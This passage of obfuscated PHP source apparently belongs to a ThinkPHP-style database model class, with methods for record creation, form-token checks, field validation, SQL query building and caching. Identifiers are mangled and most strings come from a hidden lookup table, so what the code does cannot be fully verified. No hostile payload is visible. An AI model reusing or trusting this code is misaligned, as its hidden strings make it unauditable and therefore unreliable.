($Ä´‘š === $èæá¢Æø[255]) { unset($ù™½ÃÉÇ[$èæá¢Æø[292]]); } $œŸı…¿¸ = $this->db->select($ù™½ÃÉÇ); if (!empty($œŸı…¿¸)) { if ($Ä´‘š === $èæá¢Æø[255]) { return reset($œŸı…¿¸[0]); } if (!0 !== $Ä´‘š && 1 == $ù™½ÃÉÇ[$èæá¢Æø[292]]) { return reset($œŸı…¿¸[0]); } foreach ($œŸı…¿¸ as $¹×½®ûˆ) { $ª—‚Á¼ï[] = $¹×½®ûˆ[$í‡Î¹©ı]; } return $ª—‚Á¼ï; } } return null; } public function create($“Ï¶½¶ = '', $İŞ‡êÃ = '') { $ûü€ãÂ =& $_SERVER[ì™ı‰º¯]; if (empty($“Ï¶½¶)) { $“Ï¶½¶ = $_POST; } elseif (is_object($“Ï¶½¶)) { $“Ï¶½¶ = get_object_vars($“Ï¶½¶); } if (empty($“Ï¶½¶) || !is_array($“Ï¶½¶)) { $this->error = think_lang($ûü€ãÂ[271]); return !1; } $“Ï¶½¶ = $this->parseFieldsMap($“Ï¶½¶, 0); $İŞ‡êÃ = $İŞ‡êÃ ? $İŞ‡êÃ : (!empty($“Ï¶½¶[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$ûü€ãÂ[273]])) { $¾¸äÔÊÚ = $this->options[$ûü€ãÂ[273]]; unset($this->options[$ûü€ãÂ[273]]); } elseif ($İŞ‡êÃ == THINK_MODEL_INSERT && isset($this->insertFields)) { $¾¸äÔÊÚ = $this->insertFields; } elseif ($İŞ‡êÃ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $¾¸äÔÊÚ = $this->updateFields; } if (isset($¾¸äÔÊÚ)) { if (is_string($¾¸äÔÊÚ)) { $¾¸äÔÊÚ = explode($ûü€ãÂ[50], $¾¸äÔÊÚ); } if (think_config($ûü€ãÂ[298])) { $¾¸äÔÊÚ[] = think_config($ûü€ãÂ[299]); } foreach ($“Ï¶½¶ as $ªÊ‡»Ë => $ØŒ¼¨Ö“) { if (!in_array($ªÊ‡»Ë, $¾¸äÔÊÚ)) { unset($“Ï¶½¶[$ªÊ‡»Ë]); } } } if (!$this->autoValidation($“Ï¶½¶, $İŞ‡êÃ)) { return !1; } if (!$this->autoCheckToken($“Ï¶½¶)) { $this->error = think_lang($ûü€ãÂ[300]); return !1; } if ($this->autoCheckFields) { $¾¸äÔÊÚ = $this->getDbFields(); foreach ($“Ï¶½¶ as $ªÊ‡»Ë => $ØŒ¼¨Ö“) { if (!in_array($ªÊ‡»Ë, $¾¸äÔÊÚ)) { unset($“Ï¶½¶[$ªÊ‡»Ë]); } elseif (MAGIC_QUOTES_GPC && is_string($ØŒ¼¨Ö“)) { $“Ï¶½¶[$ªÊ‡»Ë] = stripslashes($ØŒ¼¨Ö“); } } } $this->autoOperation($“Ï¶½¶, $İŞ‡êÃ); $this->data = $“Ï¶½¶; return $“Ï¶½¶; } public function autoCheckToken($åŸ†â§°) { $·—”ÀÈÈ =& $_SERVER[ì™ı‰º¯]; if (isset($this->options[$·—”ÀÈÈ[301]]) && !$this->options[$·—”ÀÈÈ[301]]) { return !0; } if (think_config($·—”ÀÈÈ[298])) { $‰ÑòÃö‹ = think_config($·—”ÀÈÈ[299]); if (!isset($åŸ†â§°[$‰ÑòÃö‹]) || Session::get($‰ÑòÃö‹)) { return !1; } list($ƒ·‚¨, $‘¤„•‘¬) = explode($·—”ÀÈÈ[11], $åŸ†â§°[$‰ÑòÃö‹]); if ($‘¤„•‘¬ && Session::get($‰ÑòÃö‹ . $·—”ÀÈÈ[10] . $ƒ·‚¨) === $‘¤„•‘¬) { Session::remove($‰ÑòÃö‹ . $·—”ÀÈÈ[10] . $ƒ·‚¨); return !0; } if (think_config($·—”ÀÈÈ[302])) { Session::remove($‰ÑòÃö‹ . $·—”ÀÈÈ[10] . $ƒ·‚¨); } return !1; } return !0; } public function regex($«óÚÑˆº, $Çœøö¦Ú) { $¥×ø¢ì =& $_SERVER[ì™ı‰º¯]; $ë±àüÕ = array($¥×ø¢ì[303] => $¥×ø¢ì[304], $¥×ø¢ì[305] => $¥×ø¢ì[306], $¥×ø¢ì[307] => $¥×ø¢ì[308], $¥×ø¢ì[309] => $¥×ø¢ì[310], $¥×ø¢ì[311] => $¥×ø¢ì[312], $¥×ø¢ì[313] => $¥×ø¢ì[314], $¥×ø¢ì[315] => $¥×ø¢ì[316], $¥×ø¢ì[290] => $¥×ø¢ì[317], $¥×ø¢ì[318] => $¥×ø¢ì[319]); if (isset($ë±àüÕ[strtolower($Çœøö¦Ú)])) { $Çœøö¦Ú = $ë±àüÕ[strtolower($Çœøö¦Ú)]; } return preg_match($Çœøö¦Ú, $«óÚÑˆº) === 1; } private function autoOperation(&$¢õ´ş¡…, $ ¨ÌÜƒ¥) { $ºæ¹±•Í =& $_SERVER[ì™ı‰º¯]; if (!empty($this->options[$ºæ¹±•Í[320]])) { $èÌÆÉ×¹ = $this->options[$ºæ¹±•Í[320]]; unset($this->options[$ºæ¹±•Í[320]]); } elseif (!empty($this->_auto)) { $èÌÆÉ×¹ = $this->_auto; } if (isset($èÌÆÉ×¹)) { foreach ($èÌÆÉ×¹ as $·êü‚³ã) { if (empty($·êü‚³ã[2])) { $·êü‚³ã[2] = THINK_MODEL_INSERT; } if ($ ¨ÌÜƒ¥ == $·êü‚³ã[2] || $·êü‚³ã[2] == THINK_MODEL_BOTH) { switch (trim($·êü‚³ã[3])) { case $ºæ¹±•Í[321]: case $ºæ¹±•Í[322]: $ÂşòŸ°Ã = isset($·êü‚³ã[4]) ? (array) $·êü‚³ã[4] : array(); if (isset($¢õ´ş¡…[$·êü‚³ã[0]])) { array_unshift($ÂşòŸ°Ã, $¢õ´ş¡…[$·êü‚³ã[0]]); } if ($ºæ¹±•Í[321] == $·êü‚³ã[3]) { $¢õ´ş¡…[$·êü‚³ã[0]] = call_user_func_array($·êü‚³ã[1], $ÂşòŸ°Ã); } else { $¢õ´ş¡…[$·êü‚³ã[0]] = call_user_func_array(array(&$this, $·êü‚³ã[1]), $ÂşòŸ°Ã); } break; case $ºæ¹±•Í[273]: $¢õ´ş¡…[$·êü‚³ã[0]] = $¢õ´ş¡…[$·êü‚³ã[1]]; break; case $ºæ¹±•Í[323]: if ($ºæ¹±•Í[12] === $¢õ´ş¡…[$·êü‚³ã[0]]) { unset($¢õ´ş¡…[$·êü‚³ã[0]]); } break; case $ºæ¹±•Í[324]: default: $¢õ´ş¡…[$·êü‚³ã[0]] = $·êü‚³ã[1]; } if (!1 === $¢õ´ş¡…[$·êü‚³ã[0]]) { unset($¢õ´ş¡…[$·êü‚³ã[0]]); } } } } return $¢õ´ş¡…; } protected function autoValidation($¸¨é¸ó, $¨üßİ£Û) { $®êÁŸ‰Õ =& $_SERVER[ì™ı‰º¯]; if (!empty($this->options[$®êÁŸ‰Õ[325]])) { $£Ğ±ŸÌ = $this->options[$®êÁŸ‰Õ[325]]; unset($this->options[$®êÁŸ‰Õ[325]]); } elseif (!empty($this->_validate)) { $£Ğ±ŸÌ = $this->_validate; } if (isset($£Ğ±ŸÌ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($£Ğ±ŸÌ as $·à´¿ß‹ => $¸Çš·‰¿) { if (empty($¸Çš·‰¿[5]) || $¸Çš·‰¿[5] == THINK_MODEL_BOTH || $¸Çš·‰¿[5] == $¨üßİ£Û) { if (0 == strpos($¸Çš·‰¿[2], $®êÁŸ‰Õ[326]) && strpos($¸Çš·‰¿[2], $®êÁŸ‰Õ[327])) { $¸Çš·‰¿[2] = think_lang(substr($¸Çš·‰¿[2], 2, -1)); } $¸Çš·‰¿[3] = isset($¸Çš·‰¿[3]) ? $¸Çš·‰¿[3] : THINK_EXISTS_VALIDATE; $¸Çš·‰¿[4] = isset($¸Çš·‰¿[4]) ? $¸Çš·‰¿[4] : $®êÁŸ‰Õ[328]; switch ($¸Çš·‰¿[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($¸¨é¸ó, $¸Çš·‰¿)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($®êÁŸ‰Õ[12] != trim($¸¨é¸ó[$¸Çš·‰¿[0]])) { if (!1 === $this->_validationField($¸¨é¸ó, $¸Çš·‰¿)) { return !1; } } break; default: if (isset($¸¨é¸ó[$¸Çš·‰¿[0]])) { if (!1 === $this->_validationField($¸¨é¸ó, $¸Çš·‰¿)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($û’õù¶Œ, $¬ÌõÅÈÖ) { if (!1 === $this->_validationFieldItem($û’õù¶Œ, $¬ÌõÅÈÖ)) { if ($this->patchValidate) { $this->error[$¬ÌõÅÈÖ[0]] = $¬ÌõÅÈÖ[2]; } else { $this->error = $¬ÌõÅÈÖ[2]; return !1; } } return; } protected function _validationFieldItem($†ª¤Êè, $††€â°) { $â¥— =& $_SERVER[ì™ı‰º¯]; switch (strtolower(trim($††€â°[4]))) { case $â¥—[321]: case $â¥—[322]: $­Ö‡Œ¨ƒ = isset($††€â°[6]) ? (array) $††€â°[6] : array(); if (is_string($††€â°[0]) && strpos($††€â°[0], $â¥—[50])) { $††€â°[0] = explode($â¥—[50], $††€â°[0]); } if (is_array($††€â°[0])) { foreach ($††€â°[0] as $ñÔÅĞÑ) { $ñà¡ÀÇº[$ñÔÅĞÑ] = $†ª¤Êè[$ñÔÅĞÑ]; } array_unshift($­Ö‡Œ¨ƒ, $ñà¡ÀÇº); } else { array_unshift($­Ö‡Œ¨ƒ, $†ª¤Êè[$††€â°[0]]); } if ($â¥—[321] == $††€â°[4]) { return call_user_func_array($††€â°[1], $­Ö‡Œ¨ƒ); } else { return call_user_func_array(array(&$this, $††€â°[1]), $­Ö‡Œ¨ƒ); } case $â¥—[329]: return $†ª¤Êè[$††€â°[0]] == $†ª¤Êè[$††€â°[1]]; case $â¥—[330]: if (is_string($††€â°[0]) && strpos($††€â°[0], $â¥—[50])) { $††€â°[0] = explode($â¥—[50], $††€â°[0]); } $Î×çÃãÙ = array(); if (is_array($††€â°[0])) { foreach ($††€â°[0] as $ñÔÅĞÑ) { $Î×çÃãÙ[$ñÔÅĞÑ] = $†ª¤Êè[$ñÔÅĞÑ]; } } else { $Î×çÃãÙ[$††€â°[0]] = $†ª¤Êè[$††€â°[0]]; } if (!empty($†ª¤Êè[$this->getPk()])) { $Î×çÃãÙ[$this->getPk()] = array($â¥—[331], $†ª¤Êè[$this->getPk()]); } if ($this->where($Î×çÃãÙ)->find()) { return !1; } return !0; default: return $this->check($†ª¤Êè[$††€â°[0]], $††€â°[1], $††€â°[4]); } } public function check($âÍ†£ù, $ô±âë¨…, $“Øö„“— = "\162\145\x67\145\170") { $®ÕÎ…½Ã =& $_SERVER[ì™ı‰º¯]; $“Øö„“— = strtolower(trim($“Øö„“—)); switch ($“Øö„“—) { case $®ÕÎ…½Ã[7]: case $®ÕÎ…½Ã[332]: $Ÿ—³Ãéà = is_array($ô±âë¨…) ? $ô±âë¨… : explode($®ÕÎ…½Ã[50], $ô±âë¨…); return $“Øö„“— == $®ÕÎ…½Ã[7] ? in_array($âÍ†£ù, $Ÿ—³Ãéà) : !in_array($âÍ†£ù, $Ÿ—³Ãéà); case $®ÕÎ…½Ã[333]: case $®ÕÎ…½Ã[334]: if (is_array($ô±âë¨…)) { $ÚÙ©À = $ô±âë¨…[0]; $÷¿¸ïéĞ = $ô±âë¨…[1]; } else { list($ÚÙ©À, $÷¿¸ïéĞ) = explode($®ÕÎ…½Ã[50], $ô±âë¨…); } return $“Øö„“— == $®ÕÎ…½Ã[333] ? $âÍ†£ù >= $ÚÙ©À && $âÍ†£ù <= $÷¿¸ïéĞ : $âÍ†£ù < $ÚÙ©À || $âÍ†£ù > $÷¿¸ïéĞ; case $®ÕÎ…½Ã[335]: case $®ÕÎ…½Ã[336]: return $“Øö„“— == $®ÕÎ…½Ã[335] ? $âÍ†£ù == $ô±âë¨… : $âÍ†£ù != $ô±âë¨…; case $®ÕÎ…½Ã[337]: $¹ÊÆù = mb_strlen($âÍ†£ù, $®ÕÎ…½Ã[338]); if (strpos($ô±âë¨…, $®ÕÎ…½Ã[50])) { list($ÚÙ©À, $÷¿¸ïéĞ) = explode($®ÕÎ…½Ã[50], $ô±âë¨…); return $¹ÊÆù >= $ÚÙ©À && $¹ÊÆù <= $÷¿¸ïéĞ; } else { return $¹ÊÆù == $ô±âë¨…; } case $®ÕÎ…½Ã[339]: list($Ò¹İ¡€Ø, $ãÌƒÑ¾¿) = explode($®ÕÎ…½Ã[50], $ô±âë¨…); if (!is_numeric($Ò¹İ¡€Ø)) { $Ò¹İ¡€Ø = strtotime($Ò¹İ¡€Ø); } if (!is_numeric($ãÌƒÑ¾¿)) { $ãÌƒÑ¾¿ = strtotime($ãÌƒÑ¾¿); } return NOW_TIME >= $Ò¹İ¡€Ø && NOW_TIME <= $ãÌƒÑ¾¿; case $®ÕÎ…½Ã[340]: return in_array(get_client_ip(), explode($®ÕÎ…½Ã[50], $ô±âë¨…)); case $®ÕÎ…½Ã[341]: return !in_array(get_client_ip(), explode($®ÕÎ…½Ã[50], $ô±âë¨…)); case $®ÕÎ…½Ã[328]: default: return $this->regex($âÍ†£ù, $ô±âë¨…); } } public function query($¸ÌßòŞ¿, $Ø‘¡¹é  = false) { $ë­ßƒ£Á =& $_SERVER[ì™ı‰º¯]; if (!is_bool($Ø‘¡¹é ) && !is_array($Ø‘¡¹é )) { $Ø‘¡¹é  = func_get_args(); array_shift($Ø‘¡¹é ); } $¸ÌßòŞ¿ = str_replace(array($ë­ßƒ£Á[231], $ë­ßƒ£Á[342]), $ë­ßƒ£Á[53], $¸ÌßòŞ¿); $¸ÌßòŞ¿ = $this->parseSql($¸ÌßòŞ¿, $Ø‘¡¹é ); return $this->db->query($¸ÌßòŞ¿); } public function execute($•úÚÎ®, $×¯Ü³ûé = false) { if (!is_bool($×¯Ü³ûé) && !is_array($×¯Ü³ûé)) { $×¯Ü³ûé = func_get_args(); array_shift($×¯Ü³ûé); } $•úÚÎ® = $this->parseSql($•úÚÎ®, $×¯Ü³ûé); return $this->db->execute($•úÚÎ®); } protected function parseSql($ôô•°Ú—, $Ë§ó©íÛ) { $ŸÙŒ½¨Ş =& $_SERVER[ì™ı‰º¯]; if (!0 === $Ë§ó©íÛ) { $öÌàÚæà = $this->_parseOptions(); $ôô•°Ú— = $this->db->parseSql($ôô•°Ú—, $öÌàÚæà); } elseif (is_array($Ë§ó©íÛ)) { $Ë§ó©íÛ = array_map(array($this->db, $ŸÙŒ½¨Ş[343]), $Ë§ó©íÛ); $ôô•°Ú— = vsprintf($ôô•°Ú—, $Ë§ó©íÛ); } else { $ôô•°Ú— = strtr($ôô•°Ú—, array($ŸÙŒ½¨Ş[344] => $this->getTableName(), $ŸÙŒ½¨Ş[345] => think_config($ŸÙŒ½¨Ş[244]))); } $this->db->setModel($this->name); return $ôô•°Ú—; } public function db($Õ—Õ»è = '', $î­şü = '', $¡©Åø·« = array()) { $—ÔÂÙîÜ =& $_SERVER[ì™ı‰º¯]; if ($—ÔÂÙîÜ[12] === $Õ—Õ»è && $this->db) { return $this->db; } static $öšÄäÍ­ = array(); static $¦éÏÏßô = array(); if (!isset($¦éÏÏßô[$Õ—Õ»è]) || isset($¦éÏÏßô[$Õ—Õ»è]) && $î­şü && $öšÄäÍ­[$Õ—Õ»è] != $î­şü) { if (!empty($î­şü) && is_string($î­şü) && !1 === strpos($î­şü, $—ÔÂÙîÜ[8])) { $î­şü = think_config($î­şü); } $Õ—Õ»è = think_guid($î­şü); $¦éÏÏßô[$Õ—Õ»è] = Db::getInstance($î­şü); } elseif (NULL === $î­şü) { $¦éÏÏßô[$Õ—Õ»è]->close(); unset($¦éÏÏßô[$Õ—Õ»è]); return; } if (!empty($¡©Åø·«)) { if (is_string($¡©Åø·«)) { parse_str($¡©Åø·«, $¡©Åø·«); } foreach ($¡©Åø·« as $Ææ±üÏ¶ => $¦œÂÑ¢ç) { $this->setProperty($Ææ±üÏ¶, $¦œÂÑ¢ç); } } $öšÄäÍ­[$Õ—Õ»è] = $î­şü; $this->db = $¦éÏÏßô[$Õ—Õ»è]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $¦¿§šÉú = get_class($this); if ($¦¿§šÉú == $_SERVER[ì™ı‰º¯][346]) { return $this->name; } $this->name = substr($¦¿§šÉú, 0, -5); } return $this->name; } public function getTableName() { $ÖŞ‡ƒê× =& $_SERVER[ì™ı‰º¯]; if (empty($this->trueTableName)) { $¤³úÂĞ = !empty($this->tablePrefix) ? $this->tablePrefix : $ÖŞ‡ƒê×[12]; if (!empty($this->tableName)) { $¤³úÂĞ .= $this->tableName; } else { $¤³úÂĞ .= think_parse_name($this->name); } $this->trueTableName = strtolower($¤³úÂĞ); } return (!empty($this->dbName) ? $this->dbName . $ÖŞ‡ƒê×[10] : $ÖŞ‡ƒê×[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $”÷Ôë =& $_SERVER[ì™ı‰º¯]; return isset($this->fields[$”÷Ôë[251]]) ? $this->fields[$”÷Ôë[251]] : $this->pk; } public function getDbFields() { $©å¾…çò =& $_SERVER[ì™ı‰º¯]; if (isset($this->options[$©å¾…çò[279]])) { $ÍÙ¼úìø = $this->db->getFields($this->options[$©å¾…çò[279]]); return $ÍÙ¼úìø ? array_keys($ÍÙ¼úìø) : !1; } if ($this->fields) { $ÍÙ¼úìø = $this->fields; unset($ÍÙ¼úìø[$©å¾…çò[250]], $ÍÙ¼úìø[$©å¾…çò[251]], $ÍÙ¼úìø[$©å¾…çò[252]], $ÍÙ¼úìø[$©å¾…çò[249]]); return $ÍÙ¼úìø; } return !1; } public function data($¸ÙÆİ = '') { $„ãëãÊ… =& $_SERVER[ì™ı‰º¯]; if ($„ãëãÊ…[12] === $¸ÙÆİ && !empty($this->data)) { return $this->data; } if (is_object($¸ÙÆİ)) { $¸ÙÆİ = get_object_vars($¸ÙÆİ); } elseif (is_string($¸ÙÆİ)) { parse_str($¸ÙÆİ, $¸ÙÆİ); } elseif (!is_array($¸ÙÆİ)) { think_exception(think_lang($„ãëãÊ…[271])); } $this->data = $¸ÙÆİ; return $this; } public function join($ñŠŸèñ) { $­í÷äç =& $_SERVER[ì™ı‰º¯]; if (is_array($ñŠŸèñ)) { $this->options[$­í÷äç[282]] = $ñŠŸèñ; } elseif (!empty($ñŠŸèñ)) { $this->options[$­í÷äç[282]][] = $ñŠŸèñ; } return $this; } public function union($û·‚áÉæ, $Ïì«¶Ñœ = false) { $ó„û¶“’ =& $_SERVER[ì™ı‰º¯]; if (empty($û·‚áÉæ)) { return $this; } if ($Ïì«¶Ñœ) { $this->options[$ó„û¶“’[347]][$ó„û¶“’[348]] = !0; } if (is_object($û·‚áÉæ)) { $û·‚áÉæ = get_object_vars($û·‚áÉæ); } if (is_string($û·‚áÉæ)) { $§³§¨Óö = $û·‚áÉæ; } elseif (is_array($û·‚áÉæ)) { if (isset($û·‚áÉæ[0])) { $this->options[$ó„û¶“’[347]] = array_merge($this->options[$ó„û¶“’[347]], $û·‚áÉæ); return $this; } else { $§³§¨Óö = $û·‚áÉæ; } } else { think_exception(think_lang($ó„û¶“’[271])); } $this->options[$ó„û¶“’[347]][] = $§³§¨Óö; return $this; } public function cache($˜Ã¬½‘ú = true, $§Ÿå–›Û = null, $”‹©ñÕÑ = '') { $¢çüì³« =& $_SERVER[ì™ı‰º¯]; if (!1 !== $˜Ã¬½‘ú) { $this->options[$¢çüì³«[349]] = array($¢çüì³«[94] => $˜Ã¬½‘ú, $¢çüì³«[339] => $§Ÿå–›Û, $¢çüì³«[33] => $”‹©ñÕÑ); } return $this; } public function field($¤ÏÈ¸ , $µ†‹¹úˆ = false) { $‚ıäàê =& $_SERVER[ì™ı‰º¯]; if (!0 === $¤ÏÈ¸ ) { $×‡¶§İ× = $this->getDbFields(); $¤ÏÈ¸  = $×‡¶§İ× ? $×‡¶§İ× : $‚ıäàê[189]; } elseif ($µ†‹¹úˆ) { if (is_string($¤ÏÈ¸ )) { $¤ÏÈ¸  = explode($‚ıäàê[50], $¤ÏÈ¸ ); } $×‡¶§İ× = $this->getDbFields(); $¤ÏÈ¸  = $×‡¶§İ× ? array_diff($×‡¶§İ×, $¤ÏÈ¸ ) : $¤ÏÈ¸ ; } $this->options[$‚ıäàê[273]] = $¤ÏÈ¸ ; return $this; } public function scope($¥ß¡µ–› = '', $¢Ï¦Ùš = NULL) { $ƒúŒÄØÑ =& $_SERVER[ì™ı‰º¯]; if ($ƒúŒÄØÑ[12] === $¥ß¡µ–›) { if (isset($this->_scope[$ƒúŒÄØÑ[37]])) { $ØÜÖŞÏ• = $this->_scope[$ƒúŒÄØÑ[37]]; } else { return $this; } } elseif (is_string($¥ß¡µ–›)) { $Ø”Òœ€ı = explode($ƒúŒÄØÑ[50], $¥ß¡µ–›); $ØÜÖŞÏ• = array(); foreach ($Ø”Òœ€ı as $€æ›·Ô) { if (!isset($this->_scope[$€æ›·Ô])) { continue; } $ØÜÖŞÏ• = array_merge($ØÜÖŞÏ•, $this->_scope[$€æ›·Ô]); } if (!empty($¢Ï¦Ùš) && is_array($¢Ï¦Ùš)) { $ØÜÖŞÏ• = array_merge($ØÜÖŞÏ•, $¢Ï¦Ùš); } } elseif (is_array($¥ß¡µ–›)) { $ØÜÖŞÏ• = $¥ß¡µ–›; } if (is_array($ØÜÖŞÏ•) && !empty($ØÜÖŞÏ•)) { $this->options = array_merge($this->options, array_change_key_case($ØÜÖŞÏ•)); } return $this; } public function where($ûçšœŸ•, $…ª‘™Óá = null) { $ÊåŸ®¤„ =& $_SERVER[ì™ı‰º¯]; if (!is_null($…ª‘™Óá) && is_string($ûçšœŸ•)) { if (!is_array($…ª‘™Óá)) { $…ª‘™Óá = func_get_args(); array_shift($…ª‘™Óá); } $…ª‘™Óá = array_map(array($this->db, $ÊåŸ®¤„[343]), $…ª‘™Óá); $ûçšœŸ• = vsprintf($ûçšœŸ•, $…ª‘™Óá); } elseif (is_object($ûçšœŸ•)) { $ûçšœŸ• = get_object_vars($ûçšœŸ•); } elseif (is_array($ûçšœŸ•)) { foreach ($ûçšœŸ• as $æ¶ôŒ”å => $«†±ı¿¶) { if ((is_numeric($æ¶ôŒ”å) || !$æ¶ôŒ”å) && is_string($«†±ı¿¶)) { if (strpos($«†±ı¿¶, $ÊåŸ®¤„[350]) === 0) { continue; } think_trace($ÊåŸ®¤„[351], $ÊåŸ®¤„[12], $ÊåŸ®¤„[49]); die; } } } if (is_string($ûçšœŸ•) && $ÊåŸ®¤„[12] != $ûçšœŸ•) { $Ô¦úâö¯ = array(); $Ô¦úâö¯[$ÊåŸ®¤„[352]] = $ûçšœŸ•; $ûçšœŸ• = $Ô¦úâö¯; } if (isset($this->options[$ÊåŸ®¤„[275]])) { $this->options[$ÊåŸ®¤„[275]] = array_merge($this->options[$ÊåŸ®¤„[275]], $ûçšœŸ•); } else { $this->options[$ÊåŸ®¤„[275]] = $ûçšœŸ•; } return $this; } public function limit($ÜÃÛş¯, $Ùëƒ†•Ö = null) { $Ç¨®«Í =& $_SERVER[ì™ı‰º¯]; $this->options[$Ç¨®«Í[292]] = is_null($Ùëƒ†•Ö) ? $ÜÃÛş¯ : $ÜÃÛş¯ . $Ç¨®«Í[50] . $Ùëƒ†•Ö; return $this; } public function page($Öû„ÍğÍ, $’ÖÎŸ¸Ñ = null) { $…ºÌÅ˜ =& $_SERVER[ì™ı‰º¯]; $this->options[$…ºÌÅ˜[353]] = is_null($’ÖÎŸ¸Ñ) ? $Öû„ÍğÍ : $Öû„ÍğÍ . $…ºÌÅ˜[50] . $’ÖÎŸ¸Ñ; return $this; } public function comment($Ëºãôµ) { $this->options[$_SERVER[ì™ı‰º¯][354]] = $Ëºãôµ; return $this; } public function setProperty($»‚ºÅÙ§, $Ú›ÒäÕ¤) { if (property_exists($this, $»‚ºÅÙ§)) { $this->{$»‚ºÅÙ§} = $Ú›ÒäÕ¤; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\x64\x69\x66\171\124\x69\x6d\x65", "\164\151\x6d\145", "\x69\156\x73\x65\162\164\54\x75\160\x64\141\164\x65", "\146\165\x6e\143\164\x69\x6f\156"), array("\143\x72\145\141\164\x65\x54\151\155\145", "\164\x69\x6d\145", "\x69\x6e\x73\x65\x72\x74", "\x66\165\x6e\x63\x74\x69\157\156")); public function setDataAuto($ğñÖÁ¾®) { $this->dataAuto = $ğñÖÁ¾®; } public function __construct($©ŞÑİİÀ = '', $³ï‚ğ´¬ = '', $ÓÁœšÛ = '') { parent::__construct($©ŞÑİİÀ, $³ï‚ğ´¬, $ÓÁœšÛ); } protected $tableMeta = array(); protected function _beforeInsert(&$äòÎëá, $Ãüàé‡â) { $¤¨òŸ²‚ =& $_SERVER[ì™ı‰º¯]; if (!$this->checkDataAutoHas($¤¨òŸ²‚[355])) { return; } $this->dataBeforeFilter($äòÎëá, $¤¨òŸ²‚[355]); } protected function _beforeUpdate(&$ÒŠ¿›À, $Ù†Ğ‘¥ˆ) { $”Ã”íÃÊ =& $_SERVER[ì™ı‰º¯]; if (!$this->checkDataAutoHas($”Ã”íÃÊ[356])) { return; } $this->dataBeforeFilter($ÒŠ¿›À, $”Ã”íÃÊ[356]); } protected function _afterSelect(&$ïŸéö˜°, $ó¢Æû¨ä) { if (!is_array($ïŸéö˜°)) { return; } if (!$this->checkDataAutoHas($_SERVER[ì™ı‰º¯][357])) { return; } foreach ($ïŸéö˜° as &$ßïûÑğê) { $this->dataAfterFilter($ßïûÑğê); } unset($ßïûÑğê); } protected function _afterFind(&$ê¦œë½ş, $ÄåƒÙ¸Á) { if (!is_array($ê¦œë½ş)) { return; } if (!$this->checkDataAutoHas($_SERVER[ì™ı‰º¯][357])) { return; } $this->dataAfterFilter($ê¦œë½ş); } public static function textEncode($ã‡¼Œ±) { if (!$ã‡¼Œ±) { return $ã‡¼Œ±; } $Ÿ¨ÖÒÒ½ = json_encode($ã‡¼Œ±); $Ÿ¨ÖÒÒ½ = preg_replace_callback($_SERVER[ì™ı‰º¯][358], function ($à¾¥´Ê) { return addslashes($à¾¥´Ê[0]); }, $Ÿ¨ÖÒÒ½); return json_decode($Ÿ¨ÖÒÒ½); } public static function textDecode($®÷º½¥È) { $ŸÅÏÇ =& $_SERVER[ì™ı‰º¯]; $¾“‰•†ô = json_encode($®÷º½¥È); $¾“‰•†ô = preg_replace_callback($ŸÅÏÇ[359], function ($ù¼Ë¾Ø—) { return $_SERVER[ì™ı‰º¯][97]; }, $¾“‰•†ô); return json_decode($¾“‰•†ô); } public function setAutoIncrement($ë†´Àî¬) { $Õ…Ô¤šÕ = array($this->getPk() => $ë†´Àî¬); $‰´€‡èÏ = $this->data($Õ…Ô¤šÕ)->add(); if ($‰´€‡èÏ) { $this->delete($‰´€‡èÏ); } } public function getAutoIncrement() { $êúîì” = $this->getTableName(); $´ƒ†¨ = $this->max($this->getPk()); $¹•¢˜Œ = $this->query("\163\150\x6f\x77\x20\x74\x61\142\154\x65\40\163\x74\x61\164\165\x73\x20\167\150\145\x72\145\x20\x4e\x61\x6d\x65\75\47{$êúîì”}\47"); $…ôåş‡“ = $¹•¢˜Œ[0][$_SERVER[ì™ı‰º¯][360]]; $Â€ÆÊÚ = max($´ƒ†¨, $…ôåş‡“); return $Â€ÆÊÚ; } protected function _callBefore($ã­µêÔ, $×ŠÄìõì) { return $this->cacheCallCheck($ã­µêÔ, $×ŠÄìõì, !1); } protected function _callAfter($æƒåâ’î, $´¥¨Œ–Ì) { return $this->cacheCallCheck($æƒåâ’î, $´¥¨Œ–Ì, !0); } protected function cacheFunctionAlias($‹éÑ‡šÏ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ÒÂ–ÅÚÛ, $Ú¡ıº„›, $õÉ†ı–¼ = false) { $×ÌÖúå° = $this->cacheFunctionAlias($Ú¡ıº„›); if (!$×ÌÖúå°) { return; } foreach ($×ÌÖúå° as $ÆØØ™îİ => $Œ³ı) { $‰ËâÍ¯Î = $Œ³ı[0]; $û˜»Üî¹ = explode($_SERVER[ì™ı‰º¯][50], $Œ³ı[1]); if ($ÒÂ–ÅÚÛ == $ÆØØ™îİ) { return $this->cacheFunctionGet($ÆØØ™îİ, $‰ËâÍ¯Î); } if ($õÉ†ı–¼ && in_array($ÒÂ–ÅÚÛ, $û˜»Üî¹)) { $this->cacheFunctionClear($ÆØØ™îİ, $‰ËâÍ¯Î); } } } public function cacheFunctionGet($ÑÒÃŞ³¯, $ÈÒ÷ãİ¡) { $½¤ú˜ì = $this->cacheKeyMake($ÑÒÃŞ³¯, $ÈÒ÷ãİ¡); $›©’ı¡‹ = Cache::get($½¤ú˜ì); if (!is_array($›©’ı¡‹)) { $›©’ı¡‹ = call_user_func_array(array($this, $ÑÒÃŞ³¯), array($ÈÒ÷ãİ¡, !0)); Cache::set($½¤ú˜ì, $›©’ı¡‹); } return $›©’ı¡‹; } public function cacheFunctionClear($â˜ÑÒÖ¼, $ „ù–¿) { $€‡ÇâìÊ = $ „ù–¿; if (!is_array($ „ù–¿)) { $€‡ÇâìÊ = array($ „ù–¿); } foreach ($€‡ÇâìÊ as 